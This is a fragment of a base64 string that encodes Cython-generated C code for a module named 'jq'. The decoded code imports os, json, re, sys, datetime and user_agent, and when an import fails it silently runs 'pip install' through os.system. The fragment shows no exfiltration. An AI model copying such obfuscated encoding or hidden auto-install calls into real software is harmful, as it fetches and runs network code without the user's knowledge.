dF9lcnJvcilcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzEwID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDIzLCBfX3B5eF9MMjBfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMjMsIF9fcHl4X0wyMF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICBfX3B5eF90XzYgPSAxO1xuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9waXBfaW5zdGFsbF9iczR9O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzksIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjMsIF9fcHl4X0wyMF9leGNlcHRfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgfVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBnb3RvIF9fcHl4X0wxOV9leGNlcHRpb25faGFuZGxlZDtcbiAgICB9XG5cbiAgICBcbiAgICBfX3B5eF9MMjBfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0wxOV9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7XG4gICAgX19weXhfTDIzX3RyeV9lbmQ6O1xuICB9XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfOCwgJl9fcHl4X3RfNywgJl9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2pzb24sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyNSwgX19weXhfTDI2X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2pzb24sIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyNSwgX19weXhfTDI2X2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDI2LCBfX3B5eF9MMjZfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmUsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyNiwgX19weXhfTDI2X2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDI3LCBfX3B5eF9MMjZfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyNywgX19weXhfTDI2X2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXMsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyOCwgX19weXhfTDI2X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5cywgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI4LCBfX3B5eF9MMjZfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICAgICAgXG4gICAgfVxuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIGdvdG8gX19weXhfTDMxX3RyeV9lbmQ7XG4gICAgX19weXhfTDI2X2Vycm9yOjtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuXG4gICAgXG4gICAgIHtcbiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygianEiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMiwgJl9fcHl4X3RfNSwgJl9fcHl4X3RfMykgPCAwKSBfX1BZWF9FUlIoMCwgMjksIF9fcHl4X0wyOF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF85ID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDMwLCBfX3B5eF9MMjhfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAzMCwgX19weXhfTDI4X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICBfX3B5eF90XzYgPSAxO1xuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3BpcF9pbnN0YWxsX2pzb259O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzExLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDMwLCBfX3B5eF9MMjhfZXhjZXB0X2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgZ290byBfX3B5eF9MMjdfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuXG4gICAgXG4gICAgX19weXhfTDI4X2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfMSk7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MMjdfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpO1xuICAgIF9fcHl4X0wzMV90cnlfZW5kOjtcbiAgfVxuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzcsICZfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8zID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGV0aW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzIsIF9fcHl4X0wzNF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgICAgX19weXhfdF81ID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRldGltZSwgX19weXhfdF8zLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzIsIF9fcHl4X0wzNF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGV0aW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzIsIF9fcHl4X0wzNF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRldGltZSwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMyLCBfX3B5eF9MMzRfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuXG4gICAgICBcbiAgICB9XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgZ290byBfX3B5eF9MMzlfdHJ5X2VuZDtcbiAgICBfX3B5eF9MMzRfZXJyb3I6O1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG5cbiAgICBcbiAgICAge1xuICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJqcSIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF81LCAmX19weXhfdF8zLCAmX19weXhfdF8yKSA8IDApIF9fUFlYX0VSUigwLCAzMywgX19weXhfTDM2X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzExID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAzNCwgX19weXhfTDM2X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpO1xuICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDM0LCBfX3B5eF9MMzZfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgICBfX3B5eF90XzYgPSAxO1xuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9waXBfaW5zdGFsbF9yZX07XG4gICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzNCwgX19weXhfTDM2X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICB9XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDM1X2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgIH1cblxuICAgIFxuICAgIF9fcHl4X0wzNl9leGNlcHRfZXJyb3I6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF83LCBfX3B5eF90XzgpO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDM1X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTtcbiAgICBfX3B5eF9MMzlfdHJ5X2VuZDo7XG4gIH1cblxuICBcbiAge1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF84LCAmX19weXhfdF83LCAmX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICAge1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5TGlzdF9QYWNrKDEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5lcmF0ZV91c2VyX2FnZW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzYsIF9fcHl4X0w0Ml9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91c2VyX2FnZW50XzIsIF9fcHl4X3RfMiwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM2LCBfX3B5eF9MNDJfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5lcmF0ZV91c2VyX2FnZW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzYsIF9fcHl4X0w0Ml9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5lcmF0ZV91c2VyX2FnZW50LCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzYsIF9fcHl4X0w0Ml9lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBnb3RvIF9fcHl4X0w0N190cnlfZW5kO1xuICAgIF9fcHl4X0w0Ml9lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcblxuICAgIFxuICAgICB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImpxIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzMsICZfX3B5eF90XzIsICZfX3B5eF90XzUpIDwgMCkgX19QWVhfRVJSKDAsIDM3LCBfX3B5eF9MNDRfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMTAgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMzgsIF9fcHl4X0w0NF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAzOCwgX19weXhfTDQ0X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgIF9fcHl4X3RfNiA9IDE7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3BpcF9pbnN0YWxsX3VzZXJfYWdlbnR9O1xuICAgICAgICBfX3B5eF90X